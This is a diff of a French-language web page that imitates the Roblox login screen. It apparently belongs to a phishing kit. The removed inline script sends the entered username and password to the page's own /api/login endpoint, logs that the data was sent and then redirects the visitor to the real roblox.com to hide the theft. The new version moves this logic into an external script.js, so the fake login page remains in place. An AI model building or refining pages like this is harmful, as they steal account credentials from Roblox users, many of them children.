@@ -297,7 +297,6 @@
     <div class="login-card">
       <h1>Connexion à Roblox</h1>
       
-      <!-- FORMULAIRE MIS À JOUR AVEC LES IDS -->
       <form id="loginForm">
         <div class="form-group">
           <input type="text" id="username" class="input-field" placeholder="Identifiant/E-mail/Téléphone" required>
@@ -319,35 +318,8 @@
     </div>
   </div>
 
-  <!-- SCRIPT PLACÉ CORRECTEMENT AVANT LA FIN DU BODY -->
-  <script>
-  const form = document.getElementById('loginForm');
-
-  form.addEventListener('submit', async (e) => {
-    e.preventDefault(); // Empêche le rechargement de la page
-
-    const username = document.getElementById('username').value;
-    const password = document.getElementById('password').value;
-
-    try {
-      const response = await fetch('/api/login', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ username, password })
-      });
-
-      const data = await response.json();
-
-      if (data.success) {
-        console.log('Données transmises !');
-        // Redirection optionnelle après la connexion :
-        window.location.href = 'https://www.roblox.com';
-      }
-    } catch (error) {
-      console.error('Erreur :', error);
-    }
-  });
-  </script>
+  <!-- Lien vers le fichier JavaScript externe -->
+  <script src="script.js"></script>
 
 </body>
 </html>
